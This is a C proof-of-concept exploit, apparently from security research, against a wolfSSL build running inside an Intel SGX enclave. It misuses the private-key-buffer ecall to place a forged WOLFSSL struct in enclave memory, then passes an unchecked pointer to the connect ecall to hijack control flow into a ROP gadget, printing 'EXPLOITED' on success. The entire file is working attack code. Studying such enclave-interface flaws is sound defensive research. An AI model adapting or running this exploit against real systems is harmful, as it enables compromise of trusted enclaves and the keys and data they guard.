#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "sgx_edger8r.h" // sgx_ecall
#include "sgx_urts.h"    // sgx_create_enclave

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

int initialize_enclave(const char *enclave_filename) {
  if (global_eid != 0)
    return 0;

  sgx_launch_token_t token = {0};
  int updated;
  sgx_status_t ret = sgx_create_enclave(enclave_filename, SGX_DEBUG_FLAG,
                                        &token, &updated, &global_eid, NULL);
  if (ret != SGX_SUCCESS)
    return -1;

  return 0;
}

int call_ecall(int ecall_idx, void *ms) {
  sgx_ecall(global_eid, ecall_idx, 0, ms);
}

int main(int argc, char **argv) {
  if (initialize_enclave("enclave.signed.so") < 0)
    return -1;

  // ECALL:
  // public WOLFSSL_METHOD* enc_wolfTLSv1_2_client_method(void);
  uint64_t ms1[1] = {0};
  call_ecall(5, ms1); // client method

  // ECALL:
  // public WOLFSSL_CTX* enc_wolfSSL_CTX_new([user_check] WOLFSSL_METHOD*
  // method);
  uint64_t ms2[2] = {0, ms1[0]};
  call_ecall(7, ms2); // CTX_new(method)
  uint64_t ctx = ms2[0];

  // Here we abuse the function use_PrivateKey_buffer to move an arbitrary
  // buffer into enclave memory. However, also other functions, such as the
  // `write` function would be suitable to achieve this.
  //
  // The buffer in the enclave memory then contains a fake WOLFSSL struct, which
  // we abuse later.

  // Buffer, which contains the fake WOLFSSL struct
  uint64_t buffer[1000] = {0};
  // necessary values, part of fake WOLFSSL struct
  buffer[0x3a0 / sizeof(uint64_t)] = 0x20;
  buffer[0x120 / sizeof(uint64_t)] = 0x1;
  // JUMP TARGET: return 2
  // This is the address of a "ROP Gadget" in sgx_enc_wolfSSL_CTX_new
  // ```
  //   mov rax, 2
  //   ret
  // ```
  // This is just to demonstrate the control-flow hijack and will immediately
  // return with a return value that is passed through to the untrusted world.
  //
  buffer[0x58 / sizeof(uint64_t)] = ctx & 0xffffffffff000000 | 0x1927;

  // ECALL:
  // public int enc_wolfSSL_CTX_use_PrivateKey_buffer(
  //    [user_check] WOLFSSL_CTX* ctx,
  //    [in, size=sz] const unsigned char* buf,
  //    long sz,
  //    int type);
  uint64_t ms3[5] = {0, ctx, (uint64_t)buffer, sizeof(buffer), 1};
  call_ecall(8, ms3); // use_priv_key_buffer(ctx, buf, size, type)

  // we pass a single parameter, which is the pointer to the fake WOLFSSL
  // object.
  //
  // ECALL:
  // public int enc_wolfSSL_connect([user_check]WOLFSSL* ssl);
  uint64_t ms4[2] = {0,
                     (uint64_t)(ctx + 0x228)}; // _in_buf of use_priv_key_buffer
  // ms4[1] = ms2[0];
  call_ecall(15, ms4); // connect(ctx)

  switch ((int)ms4[0]) {
  case 2:
    printf("EXPLOITED\n");
    break;
  default:
  case -1:
    printf("ERROR\n");
  }
}
